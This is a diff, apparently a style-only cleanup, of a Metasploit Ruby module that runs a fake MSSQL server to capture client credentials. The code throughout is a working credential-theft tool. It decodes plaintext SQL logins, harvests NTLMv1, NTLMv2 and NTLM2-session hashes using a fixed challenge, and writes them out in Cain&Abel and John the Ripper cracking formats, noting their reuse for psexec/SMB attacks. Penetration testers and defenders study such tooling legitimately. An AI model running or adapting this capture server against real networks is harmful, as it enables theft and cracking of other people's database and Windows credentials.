@@ -3,7 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 NTLM_CONST = Rex::Proto::NTLM::Constants
 NTLM_CRYPT = Rex::Proto::NTLM::Crypt
 MESSAGE = Rex::Proto::NTLM::Message
@@ -14,45 +13,46 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   class Constants
-    TDS_MSG_RESPONSE  = 0x04
-    TDS_MSG_LOGIN     = 0x10
-    TDS_MSG_SSPI      = 0x11
-    TDS_MSG_PRELOGIN  = 0x12
+    TDS_MSG_RESPONSE = 0x04
+    TDS_MSG_LOGIN = 0x10
+    TDS_MSG_SSPI = 0x11
+    TDS_MSG_PRELOGIN = 0x12
 
-    TDS_TOKEN_ERROR   = 0xAA
-    TDS_TOKEN_AUTH    = 0xED
+    TDS_TOKEN_ERROR = 0xAA
+    TDS_TOKEN_AUTH = 0xED
   end
 
   def initialize
     super(
-      'Name'           => 'Authentication Capture: MSSQL',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: MSSQL',
+      'Description' => %q{
         This module provides a fake MSSQL service that
       is designed to capture authentication credentials. The modules
       supports both the weak encoded database logins as well as Windows
       logins (NTLM).
       },
-      'Author'         => 'Patrik Karlsson <patrik[at]cqure.net>',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [[ 'Capture', 'Description' => 'Run MSSQL capture server' ]],
+      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
+      'License' => MSF_LICENSE,
+      'Actions' => [[ 'Capture', 'Description' => 'Run MSSQL capture server' ]],
       'PassiveActions' => [ 'Capture' ],
-      'DefaultAction'  => 'Capture'
+      'DefaultAction' => 'Capture'
     )
 
     register_options(
       [
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 1433 ]),
-        OptString.new('CAINPWFILE',  [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
-        OptString.new('JOHNPWFILE',  [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
-        OptString.new('CHALLENGE',   [ true, "The 8 byte challenge ", "1122334455667788" ])
-      ])
+        OptString.new('CAINPWFILE', [ false, "The local filename to store the hashes in Cain&Abel format", nil ]),
+        OptString.new('JOHNPWFILE', [ false, "The prefix to the local filename to store the hashes in JOHN format", nil ]),
+        OptString.new('CHALLENGE', [ true, "The 8 byte challenge ", "1122334455667788" ])
+      ]
+    )
 
     register_advanced_options(
       [
         OptBool.new("SMB_EXTENDED_SECURITY", [ true, "Use smb extended security negociation, when set client will use ntlmssp, if not then client will use classic lanman authentification", false ]),
-        OptString.new('DOMAIN_NAME',         [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
-      ])
-
+        OptString.new('DOMAIN_NAME', [ true, "The domain name used during smb exchange with smb extended security set ", "anonymous" ])
+      ]
+    )
   end
 
   def setup
@@ -71,31 +71,31 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # those variables will prevent to spam the screen with identical hashes (works only with ntlmv1)
-    @previous_lm_hash="none"
-    @previous_ntlm_hash="none"
+    @previous_lm_hash = "none"
+    @previous_ntlm_hash = "none"
 
     exploit()
   end
 
   def on_client_connect(c)
     @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
-      :user    => nil,
-      :pass    => nil
+      :name => "#{c.peerhost}:#{c.peerport}",
+      :ip => c.peerhost,
+      :port => c.peerport,
+      :user => nil,
+      :pass => nil
     }
   end
 
   # decodes a mssql password
   def mssql_tds_decrypt(pass)
-    Rex::Text.to_ascii(pass.unpack("C*").map {|c| ((( c ^ 0xa5 ) & 0x0F) << 4) | ((( c ^ 0xa5 ) & 0xF0 ) >> 4) }.pack("C*"))
+    Rex::Text.to_ascii(pass.unpack("C*").map { |c| (((c ^ 0xa5) & 0x0F) << 4) | (((c ^ 0xa5) & 0xF0) >> 4) }.pack("C*"))
   end
 
   # doesn't do any real parsing, slices of the data
   def mssql_parse_prelogin(data, info)
-    status = data.slice!(0,1).unpack('C')[0]
-    len = data.slice!(0,2).unpack('n')[0]
+    status = data.slice!(0, 1).unpack('C')[0]
+    len = data.slice!(0, 2).unpack('n')[0]
 
     # just slice away the rest of the packet
     data.slice!(0, len - 4)
@@ -104,8 +104,8 @@ class MetasploitModule < Msf::Auxiliary
 
   # parses a login packet sent to the server
   def mssql_parse_login(data, info)
-    status = data.slice!(0,1).unpack('C')[0]
-    len = data.slice!(0,2).unpack('n')[0]
+    status = data.slice!(0, 1).unpack('C')[0]
+    len = data.slice!(0, 2).unpack('n')[0]
 
     if len > data.length + 4
       info[:errors] << "Login packet to short"
@@ -116,19 +116,19 @@ class MetasploitModule < Msf::Auxiliary
     #   * channel, packetno, window
     #   * login header
     #   * client name lengt & offset
-    login_hdr = data.slice!(0,4 + 36 + 4)
+    login_hdr = data.slice!(0, 4 + 36 + 4)
 
-    username_offset = data.slice!(0,2).unpack('v')[0]
-    username_length = data.slice!(0,2).unpack('v')[0]
+    username_offset = data.slice!(0, 2).unpack('v')[0]
+    username_length = data.slice!(0, 2).unpack('v')[0]
 
-    pw_offset = data.slice!(0,2).unpack('v')[0]
-    pw_length = data.slice!(0,2).unpack('v')[0]
+    pw_offset = data.slice!(0, 2).unpack('v')[0]
+    pw_length = data.slice!(0, 2).unpack('v')[0]
 
-    appname_offset = data.slice!(0,2).unpack('v')[0]
-    appname_length = data.slice!(0,2).unpack('v')[0]
+    appname_offset = data.slice!(0, 2).unpack('v')[0]
+    appname_length = data.slice!(0, 2).unpack('v')[0]
 
-    srvname_offset = data.slice!(0,2).unpack('v')[0]
-    srvname_length = data.slice!(0,2).unpack('v')[0]
+    srvname_offset = data.slice!(0, 2).unpack('v')[0]
+    srvname_length = data.slice!(0, 2).unpack('v')[0]
 
     if username_offset > 0 and pw_offset > 0
       offset = username_offset - 56
@@ -144,7 +144,7 @@ class MetasploitModule < Msf::Auxiliary
       offset = srvname_offset - 56
       info[:srvname] = Rex::Text::to_ascii(data[offset..(offset + srvname_length * 2)])
     else
-      info[:isntlm?]= true
+      info[:isntlm?] = true
     end
 
     # slice of remaining packet
@@ -176,37 +176,45 @@ class MetasploitModule < Msf::Auxiliary
       # Check if we have default values (empty pwd, null hashes, ...) and adjust the on-screen messages correctly
       case ntlm_ver
       when NTLM_CONST::NTLM_V1_RESPONSE
-        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
-          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm' })
+        if NTLM_CRYPT::is_hash_from_empty_pwd?({
+          :hash => [nt_hash].pack("H*"), :srv_challenge => @challenge,
+          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'ntlm'
+        })
           print_status("NLMv1 Hash correspond to an empty password, ignoring ... ")
           return
         end
-        if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/ ) then
+        if (lm_hash == nt_hash or lm_hash == "" or lm_hash =~ /^0*$/) then
           lm_hash_message = "Disabled"
-        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
-          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm' })
+        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({
+          :hash => [lm_hash].pack("H*"), :srv_challenge => @challenge,
+          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE, :type => 'lm'
+        })
           lm_hash_message = "Disabled (from empty password)"
         else
           lm_hash_message = lm_hash
           lm_chall_message = lm_cli_challenge
         end
       when NTLM_CONST::NTLM_V2_RESPONSE
-        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
+        if NTLM_CRYPT::is_hash_from_empty_pwd?({
+          :hash => [nt_hash].pack("H*"), :srv_challenge => @challenge,
           :cli_challenge => [nt_cli_challenge].pack("H*"),
           :user => Rex::Text::to_ascii(user),
           :domain => Rex::Text::to_ascii(domain),
-          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm' })
+          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'ntlm'
+        })
           print_status("NTLMv2 Hash correspond to an empty password, ignoring ... ")
           return
         end
         if lm_hash == '0' * 32 and lm_cli_challenge == '0' * 16
           lm_hash_message = "Disabled"
           lm_chall_message = 'Disabled'
-        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [lm_hash].pack("H*"),:srv_challenge => @challenge,
+        elsif NTLM_CRYPT::is_hash_from_empty_pwd?({
+          :hash => [lm_hash].pack("H*"), :srv_challenge => @challenge,
           :cli_challenge => [lm_cli_challenge].pack("H*"),
           :user => Rex::Text::to_ascii(user),
           :domain => Rex::Text::to_ascii(domain),
-          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm' })
+          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE, :type => 'lm'
+        })
           lm_hash_message = "Disabled (from empty password)"
           lm_chall_message = 'Disabled'
         else
@@ -214,9 +222,11 @@ class MetasploitModule < Msf::Auxiliary
           lm_chall_message = lm_cli_challenge
         end
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
-        if NTLM_CRYPT::is_hash_from_empty_pwd?({:hash => [nt_hash].pack("H*"),:srv_challenge => @challenge,
-          :cli_challenge => [lm_hash].pack("H*")[0,8],
-          :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm' })
+        if NTLM_CRYPT::is_hash_from_empty_pwd?({
+          :hash => [nt_hash].pack("H*"), :srv_challenge => @challenge,
+          :cli_challenge => [lm_hash].pack("H*")[0, 8],
+          :ntlm_ver => NTLM_CONST::NTLM_2_SESSION_RESPONSE, :type => 'ntlm'
+        })
           print_status("NTLM2_session Hash correspond to an empty password, ignoring ... ")
           return
         end
@@ -233,27 +243,27 @@ class MetasploitModule < Msf::Auxiliary
       when NTLM_CONST::NTLM_V1_RESPONSE
         smb_db_type_hash = "smb_netv1_hash"
         capturelogmessage =
-        "#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
-        "DOMAIN: #{domain} USER: #{user} \n" +
-        "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
+          "#{capturedtime}\nNTLMv1 Response Captured from #{host} \n" +
+          "DOMAIN: #{domain} USER: #{user} \n" +
+          "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} \nNTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n"
       when NTLM_CONST::NTLM_V2_RESPONSE
         smb_db_type_hash = "smb_netv2_hash"
         capturelogmessage =
-        "#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
-        "DOMAIN: #{domain} USER: #{user} \n" +
-        "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
-        "LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
-        "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
-        "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
+          "#{capturedtime}\nNTLMv2 Response Captured from #{host} \n" +
+          "DOMAIN: #{domain} USER: #{user} \n" +
+          "LMHASH:#{lm_hash_message ? lm_hash_message : "<NULL>"} " +
+          "LM_CLIENT_CHALLENGE:#{lm_chall_message ? lm_chall_message : "<NULL>"}\n" +
+          "NTHASH:#{nt_hash ? nt_hash : "<NULL>"} " +
+          "NT_CLIENT_CHALLENGE:#{nt_cli_challenge ? nt_cli_challenge : "<NULL>"}\n"
       when NTLM_CONST::NTLM_2_SESSION_RESPONSE
-        #we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
-        #also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
+        # we can consider those as netv1 has they have the same size and i cracked the same way by cain/jtr
+        # also 'real' netv1 is almost never seen nowadays except with smbmount or msf server capture
         smb_db_type_hash = "smb_netv1_hash"
         capturelogmessage =
-        "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
-        "DOMAIN: #{domain} USER: #{user} \n" +
-        "NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
-        "NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0,16] : "<NULL>"} \n"
+          "#{capturedtime}\nNTLM2_SESSION Response Captured from #{host} \n" +
+          "DOMAIN: #{domain} USER: #{user} \n" +
+          "NTHASH:#{nt_hash ? nt_hash : "<NULL>"}\n" +
+          "NT_CLIENT_CHALLENGE:#{lm_hash_message ? lm_hash_message[0, 16] : "<NULL>"} \n"
 
       else # should not happen
         return
@@ -265,59 +275,59 @@ class MetasploitModule < Msf::Auxiliary
       # Rem :  one report it as a smb_challenge on port 445 has breaking those hashes
       # will be mainly use for psexec / smb related exploit
       report_auth_info(
-        :host  => arg[:ip],
+        :host => arg[:ip],
         :port => 445,
         :sname => 'smb_client',
         :user => user,
         :pass => domain + ":" +
-        ( lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24 ) + ":" +
-        ( nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s :  "00" * 24 ) + ":" +
+        (lm_hash + lm_cli_challenge.to_s ? lm_hash + lm_cli_challenge.to_s : "00" * 24) + ":" +
+        (nt_hash + nt_cli_challenge.to_s ? nt_hash + nt_cli_challenge.to_s : "00" * 24) + ":" +
         datastore['CHALLENGE'].to_s,
         :type => smb_db_type_hash,
         :proof => "DOMAIN=#{domain}",
         :source_type => "captured",
         :active => true
       )
-      #if(datastore['LOGFILE'])
+      # if(datastore['LOGFILE'])
       #	File.open(datastore['LOGFILE'], "ab") {|fd| fd.puts(capturelogmessage + "\n")}
-      #end
+      # end
 
-      if(datastore['CAINPWFILE'] and user)
+      if (datastore['CAINPWFILE'] and user)
         if ntlm_ver == NTLM_CONST::NTLM_V1_RESPONSE or ntlm_ver == NTLM_CONST::NTLM_2_SESSION_RESPONSE
           fd = File.open(datastore['CAINPWFILE'], "ab")
           fd.puts(
-          [
-            user,
-            domain ? domain : "NULL",
-            @challenge.unpack("H*")[0],
-            lm_hash ? lm_hash : "0" * 48,
-            nt_hash ? nt_hash : "0" * 48
+            [
+              user,
+              domain ? domain : "NULL",
+              @challenge.unpack("H*")[0],
+              lm_hash ? lm_hash : "0" * 48,
+              nt_hash ? nt_hash : "0" * 48
             ].join(":").gsub(/\n/, "\\n")
-            )
-            fd.close
+          )
+          fd.close
         end
       end
 
-      if(datastore['JOHNPWFILE'] and user)
+      if (datastore['JOHNPWFILE'] and user)
         case ntlm_ver
         when NTLM_CONST::NTLM_V1_RESPONSE, NTLM_CONST::NTLM_2_SESSION_RESPONSE
           fd = File.open(datastore['JOHNPWFILE'] + '_netntlm', "ab")
           fd.puts(
-          [
-            user,"",
-            domain ? domain : "NULL",
-            lm_hash ? lm_hash : "0" * 48,
-            nt_hash ? nt_hash : "0" * 48,
-            @challenge.unpack("H*")[0]
+            [
+              user, "",
+              domain ? domain : "NULL",
+              lm_hash ? lm_hash : "0" * 48,
+              nt_hash ? nt_hash : "0" * 48,
+              @challenge.unpack("H*")[0]
             ].join(":").gsub(/\n/, "\\n")
-            )
-            fd.close
+          )
+          fd.close
         when NTLM_CONST::NTLM_V2_RESPONSE
-          #lmv2
+          # lmv2
           fd = File.open(datastore['JOHNPWFILE'] + '_netlmv2', "ab")
           fd.puts(
             [
-              user,"",
+              user, "",
               domain ? domain : "NULL",
               @challenge.unpack("H*")[0],
               lm_hash ? lm_hash : "0" * 32,
@@ -325,16 +335,16 @@ class MetasploitModule < Msf::Auxiliary
             ].join(":").gsub(/\n/, "\\n")
           )
           fd.close
-          #ntlmv2
-          fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2' , "ab")
+          # ntlmv2
+          fd = File.open(datastore['JOHNPWFILE'] + '_netntlmv2', "ab")
           fd.puts(
             [
-              user,"",
+              user, "",
               domain ? domain : "NULL",
               @challenge.unpack("H*")[0],
               nt_hash ? nt_hash : "0" * 32,
               nt_cli_challenge ? nt_cli_challenge : "0" * 160
-              ].join(":").gsub(/\n/, "\\n")
+            ].join(":").gsub(/\n/, "\\n")
           )
           fd.close
         end
@@ -345,7 +355,7 @@ class MetasploitModule < Msf::Auxiliary
   def mssql_parse_ntlmsspi(data, info)
     start = data.index('NTLMSSP')
     if start
-      data.slice!(0,start)
+      data.slice!(0, start)
     else
       print_error("Failed to find NTLMSSP authentication blob")
       return
@@ -357,23 +367,25 @@ class MetasploitModule < Msf::Auxiliary
       lm_len = ntlm_message.lm_response.length # Always 24
       nt_len = ntlm_message.ntlm_response.length
 
-      if nt_len == 24 #lmv1/ntlmv1 or ntlm2_session
-        arg = {	:ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
+      if nt_len == 24 # lmv1/ntlmv1 or ntlm2_session
+        arg = {
+          :ntlm_ver => NTLM_CONST::NTLM_V1_RESPONSE,
           :lm_hash => ntlm_message.lm_response.unpack('H*')[0],
           :nt_hash => ntlm_message.ntlm_response.unpack('H*')[0]
         }
 
-        if @s_ntlm_esn && arg[:lm_hash][16,32] == '0' * 32
+        if @s_ntlm_esn && arg[:lm_hash][16, 32] == '0' * 32
           arg[:ntlm_ver] = NTLM_CONST::NTLM_2_SESSION_RESPONSE
         end
         # if the length of the ntlm response is not 24 then it will be bigger and represent
         # a ntlmv2 response
-      elsif nt_len > 24 #lmv2/ntlmv2
-        arg = {	:ntlm_ver 		=> NTLM_CONST::NTLM_V2_RESPONSE,
-          :lm_hash 		=> ntlm_message.lm_response[0, 16].unpack('H*')[0],
-          :lm_cli_challenge 	=> ntlm_message.lm_response[16, 8].unpack('H*')[0],
-          :nt_hash 		=> ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
-          :nt_cli_challenge 	=> ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
+      elsif nt_len > 24 # lmv2/ntlmv2
+        arg = {
+          :ntlm_ver => NTLM_CONST::NTLM_V2_RESPONSE,
+          :lm_hash => ntlm_message.lm_response[0, 16].unpack('H*')[0],
+          :lm_cli_challenge => ntlm_message.lm_response[16, 8].unpack('H*')[0],
+          :nt_hash => ntlm_message.ntlm_response[0, 16].unpack('H*')[0],
+          :nt_cli_challenge => ntlm_message.ntlm_response[16, nt_len - 16].unpack('H*')[0]
         }
       elsif nt_len == 0
         print_status("Empty hash from #{smb[:name]} captured, ignoring ... ")
@@ -384,7 +396,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       arg[:user] = ntlm_message.user
-      arg[:domain]   = ntlm_message.domain
+      arg[:domain] = ntlm_message.domain
       arg[:ip] = info[:ip]
       arg[:host] = info[:ip]
 
@@ -398,7 +410,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # slice of remainder
-    data.slice!(0,data.length)
+    data.slice!(0, data.length)
   end
 
   #
@@ -407,8 +419,9 @@ class MetasploitModule < Msf::Auxiliary
   def mssql_parse_reply(data, info)
     info[:errors] = []
     return if not data
-    until data.empty? or ( info[:errors] and not info[:errors].empty? )
-      token = data.slice!(0,1).unpack('C')[0]
+
+    until data.empty? or (info[:errors] and not info[:errors].empty?)
+      token = data.slice!(0, 1).unpack('C')[0]
       case token
       when Constants::TDS_MSG_LOGIN
         mssql_parse_login(data, info)
@@ -440,14 +453,14 @@ class MetasploitModule < Msf::Auxiliary
       18456,  # SQL Error number
       1,      # state: 1
       14,     # severity: 14
-      msg.length,   # error msg length
+      msg.length, # error msg length
       0,
       Rex::Text::to_unicode(msg),
       0, # server name length
       0, # process name length
       0, # line number
       "fd0200000000000000"
-      ].pack("CCnnCCCvVCCCCA*CCnH*")
+    ].pack("CCnnCCCvVCCCCA*CCnH*")
     c.put data
   end
 
@@ -460,15 +473,15 @@ class MetasploitModule < Msf::Auxiliary
     if @s_ntlm_esn
       sb_flag = 0xe28a8215 # ntlm2
     else
-      sb_flag = 0xe2828215 #no ntlm2
+      sb_flag = 0xe2828215 # no ntlm2
     end
 
-    securityblob = NTLM_UTILS::make_ntlmssp_blob_chall( win_domain,
-      win_name,
-      dns_domain,
-      dns_name,
-      @challenge,
-      sb_flag)
+    securityblob = NTLM_UTILS::make_ntlmssp_blob_chall(win_domain,
+                                                       win_name,
+                                                       dns_domain,
+                                                       dns_name,
+                                                       @challenge,
+                                                       sb_flag)
 
     data = [
       Constants::TDS_MSG_RESPONSE,
@@ -477,7 +490,7 @@ class MetasploitModule < Msf::Auxiliary
       0x0000, # channel
       0x01,   # packetno
       0x00,   # window
-      Constants::TDS_TOKEN_AUTH,   # token: authentication
+      Constants::TDS_TOKEN_AUTH, # token: authentication
       securityblob.length, # length
       securityblob
     ].pack("CCnnCCCvA*")
@@ -495,13 +508,13 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_client_data(c)
-    info = {:errors => [], :ip => @state[c][:ip]}
+    info = { :errors => [], :ip => @state[c][:ip] }
     data = c.get_once
     return if not data
 
     info = mssql_parse_reply(data, info)
 
-    if(info[:errors] and not info[:errors].empty?)
+    if (info[:errors] and not info[:errors].empty?)
       print_error("#{info[:errors]}")
       c.close
       return
@@ -523,13 +536,13 @@ class MetasploitModule < Msf::Auxiliary
         mssql_send_ntlm_challenge(c, info)
       elsif info[:user] and info[:pass]
         report_auth_info(
-        :host      => @state[c][:ip],
-        :port      => datastore['SRVPORT'],
-        :sname     => 'mssql_client',
-        :user      => info[:user],
-        :pass      => info[:pass],
-        :source_type => "captured",
-        :active    => true
+          :host => @state[c][:ip],
+          :port => datastore['SRVPORT'],
+          :sname => 'mssql_client',
+          :user => info[:user],
+          :pass => info[:pass],
+          :source_type => "captured",
+          :active => true
         )
 
         print_status("MSSQL LOGIN #{@state[c][:name]} #{info[:user]} / #{info[:pass]}")
